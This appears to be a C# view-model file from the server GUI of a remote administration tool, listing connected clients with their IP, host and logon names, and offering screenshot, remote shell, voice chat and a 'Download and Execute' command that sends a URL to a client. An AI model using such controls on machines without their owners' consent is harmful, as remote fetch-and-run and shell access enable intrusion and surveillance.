namespace GuiServer.View.ViewModel
{
    using Arrowgene.Services.Common;
    using Arrowgene.Services.Network.ManagedConnection.Client;
    using Server.Database.Tables;
    using GuiServer.View.Presenter;
    using GuiServer.View.Windows;
    using NetworkObjects;
    using System;
    using System.ComponentModel;
    using System.IO;
    using System.Windows.Input;
    using System.Windows.Media.Imaging;

    public class ClientViewModel : INotifyPropertyChanged
    {
        public const string USER_FOLDER_NAME = "user";


        private ComputerInfo computerInfo;
        private RemoteShellPresenter remoteShellPresenter;
        private ScreenshotPresenter screenShotPresenter;
        private ChatPresenter chatPresenter;
        private ClientTable clientTable;

        private int id;
        private bool canScreenshot;
        private bool canDisconnect;
        private bool canDownload;
        private bool canRemoteShell;
        private bool canChat;

        public ClientViewModel(ClientSocket clientSocket)
        {
            this.IsFromDatabase = false;
            this.UniqueId = new Guid();
            this.ClientSocket = clientSocket;
            this.Init();
        }

        public ClientViewModel(ClientTable table)
        {
            this.IsFromDatabase = true;
            this.clientTable = table;
            this.id = table.Id;
        }



        public event PropertyChangedEventHandler PropertyChanged;

        public ClientSocket ClientSocket { get; set; }
        public Guid UniqueId { get; private set; }
        public int Id { get { return this.id; } set { this.id = value; NotifyPropertyChanged("Id"); } }
        public string FullName { get { return string.Format("{0}@{1}", this.id, this.Ip); } }
        public bool CanScreenshot { get { return this.canScreenshot; } set { this.canScreenshot = value; NotifyPropertyChanged("CanScreenshot"); } }
        public bool CanDisconnect { get { return this.canDisconnect; } set { this.canDisconnect = value; NotifyPropertyChanged("CanDisconnect"); } }
        public bool CanDownload { get { return this.canDownload; } set { this.canDownload = value; NotifyPropertyChanged("CanDownload"); } }
        public bool CanRemoteShell { get { return this.canRemoteShell; } set { this.canRemoteShell = value; NotifyPropertyChanged("CanRemoteShell"); } }
        public bool CanChat { get { return this.canChat; } set { this.canChat = value; NotifyPropertyChanged("CanChat"); } }
        public string UserPath { get { return this.GenerateUserPath(); } }

        public ComputerInfo ComputerInfo
        {
            get
            {
                return this.computerInfo;
            }
            set
            {
                this.computerInfo = value;
                NotifyPropertyChanged("ComputerInfo");
                NotifyPropertyChanged("OsVersion");
                NotifyPropertyChanged("Device");
                NotifyPropertyChanged("HostName"); 
                NotifyPropertyChanged("LogonName");
            }
        }

        public string IdentityName
        {
            get
            {
                string identityName = "Unknown";

                if (this.computerInfo != null)
                {
                    identityName = this.computerInfo.IdentityName;
                }
                else if (this.clientTable != null)
                {
                    identityName = this.clientTable.IdentityName;
                }

                return identityName;
            }
        }

        public string Ip
        {
            get
            {
                string ip = "Unknown";

                if (this.ClientSocket != null)
                {
                    if (this.ClientSocket.RemoteIPAddress != null)
                    {
                        ip = this.ClientSocket.RemoteIPAddress.ToString();
                    }
                }
                else if (this.clientTable != null)
                {
                    ip = this.clientTable.Ip;
                }

                return ip;
            }
        }

        public string OutTraffic
        {
            get
            {
                string inTraffic = "unknown";
                if (this.ClientSocket != null)
                {
                    inTraffic = this.GetFancyTrafficName(this.ClientSocket.OutTraffic);
                }
                else if (this.clientTable != null)
                {
                    inTraffic = this.GetFancyTrafficName(this.clientTable.OutTraffic);
                }
                return inTraffic;
            }
        }

        public string InTraffic
        {
            get
            {
                string outTraffic = "unknown";
                if (this.ClientSocket != null)
                {
                    outTraffic = this.GetFancyTrafficName(this.ClientSocket.InTraffic);
                }
                else if (this.clientTable != null)
                {
                    outTraffic = this.GetFancyTrafficName(this.clientTable.InTraffic);
                }
                return outTraffic;
            }
        }

        public string Device
        {
            get
            {
                string device = "unknown";
                if (this.computerInfo != null)
                {
                    device = this.computerInfo.Device;
                }
                else if (this.clientTable != null)
                {
                    device = this.clientTable.Device;
                }
                return device;
            }
        }

        public string HostName
        {
            get
            {
                string hostName = "unknown";
                if (this.computerInfo != null)
                {
                    hostName = this.computerInfo.HostName;
                }
                else if (this.clientTable != null)
                {
                    hostName = this.clientTable.HostName;
                }
                return hostName;
            }
        }

        public string LogonName
        {
            get
            {
                string logonName = "unknown";
                if (this.computerInfo != null)
                {
                    logonName = this.computerInfo.LogonName;
                }
                else if (this.clientTable != null)
                {
                    logonName = this.clientTable.LogonName;
                }
                return logonName;
            }
        }


        public OS.OsVersion OsVersion
        {
            get
            {
                if (this.computerInfo != null)
                {
                    return (OS.OsVersion)this.computerInfo.OsVersion;
                }
                else return OS.OsVersion.UNKNOWN;
            }
        }

        public bool IsFromDatabase { get; private set; }

        public ICommand CmdDisconnect { get; private set; }
        public ICommand CmdScreenshot { get; private set; }
        public ICommand CmdDownloadExecute { get; private set; }
        public ICommand CmdRemoteShell { get; private set; }
        public ICommand CmdChat { get; private set; }

        private void Init()
        {
            this.Id = ClientSocket.Id;
            this.canScreenshot = true;
            this.canDisconnect = true;
            this.canDownload = true;
            this.canRemoteShell = true;

            this.remoteShellPresenter = new RemoteShellPresenter(this);
            this.screenShotPresenter = new ScreenshotPresenter(this);
            this.chatPresenter = new ChatPresenter(this);

            this.CmdDisconnect = new CommandHandler(() => this.Disconnect(), this.CanDisconnect);
            this.CmdScreenshot = new CommandHandler(() => this.Screenshot(), this.CanScreenshot);
            this.CmdDownloadExecute = new CommandHandler(() => this.DownloadExecute(), this.CanDownload);
            this.CmdRemoteShell = new CommandHandler(() => this.RemoteShell(), this.CanRemoteShell);
            this.CmdChat = new CommandHandler(() => this.Chat(), this.CanChat);
        }

        private string GetFancyTrafficName(Int64 traffic)
        {
            int kbyte = 1024;
            int mbyte = kbyte * 1024;
            string result = "-1";

            if (traffic > mbyte)
            {
                result = String.Format("{0} mByte", traffic / mbyte);
            }
            else if (traffic > kbyte)
            {
                result = String.Format("{0} kByte", traffic / kbyte);
            }
            else
            {
                result = String.Format("{0} byte", traffic);
            }

            return result;
        }

        public void Dispose()
        {
            if (this.chatPresenter != null)
            {
                this.chatPresenter.Dispose();
            }
        }

        public void NotifyInTrafficChanged()
        {
            this.NotifyPropertyChanged("InTraffic");
        }

        public void NotifyOutTrafficChanged()
        {
            this.NotifyPropertyChanged("OutTraffic");
        }

        private void Disconnect()
        {
            this.ClientSocket.Close();
        }

        private void Screenshot()
        {
            ScreenshotWindow screenShotWindow = new ScreenshotWindow();
            this.screenShotPresenter.SetScreenshotWindow(screenShotWindow);
            this.screenShotPresenter.Show();

        }

        public void UpdateScreenshotOutput(BitmapImage bitmapImage)
        {
            this.screenShotPresenter.UpdateScreenshot(bitmapImage);
        }

        private void DownloadExecute()
        {
            string downloadExec = TextInputWindow.ShowWindow("Download and Execute", "URL to download:");
            if (!string.IsNullOrEmpty(downloadExec))
            {
                this.ClientSocket.SendObject(PacketId.DOWNLOAD_AND_EXECUTE, downloadExec);
            }
        }

        private void RemoteShell()
        {
            RemoteShellWindow remoteShellWindow = new RemoteShellWindow();
            this.remoteShellPresenter.SetRemoteShellWindow(remoteShellWindow);
            this.remoteShellPresenter.Show();
        }

        public void UpdateRemoteShellOutput(string output)
        {
            this.remoteShellPresenter.UpdateOutput(output);
        }

        private void Chat()
        {
            this.chatPresenter.Show();
        }

        public void UpdateChat(string message)
        {
            this.chatPresenter.Update(message);
        }

        public void SendObject(short packetId, object myClass)
        {
            this.ClientSocket.SendObject(packetId, myClass);
            this.NotifyOutTrafficChanged();
        }

        public void SendVoice(byte[] buffer, int bytesRecorded)
        {
            this.SendObject(PacketId.VOICE, buffer);
        }

        public void NotifyPropertyChanged(string obj)
        {
            if (PropertyChanged != null)
            {
                this.PropertyChanged(this, new PropertyChangedEventArgs(obj));
            }
        }

        private string GenerateUserPath()
        {
            string path;

            if (this.ComputerInfo != null)
            {
                path = Path.Combine(Program.GetApplicationPath(), ClientViewModel.USER_FOLDER_NAME, this.ComputerInfo.HostName, this.ComputerInfo.LogonName) + @"\";
            }
            else
            {
                path = Path.Combine(Program.GetApplicationPath(), ClientViewModel.USER_FOLDER_NAME, this.UniqueId.ToString()) + @"\";
            }

            return path;
        }

        public void PlayVoice(byte[] buffer)
        {
            this.chatPresenter.PlayVoice(buffer);
        }
    }
}
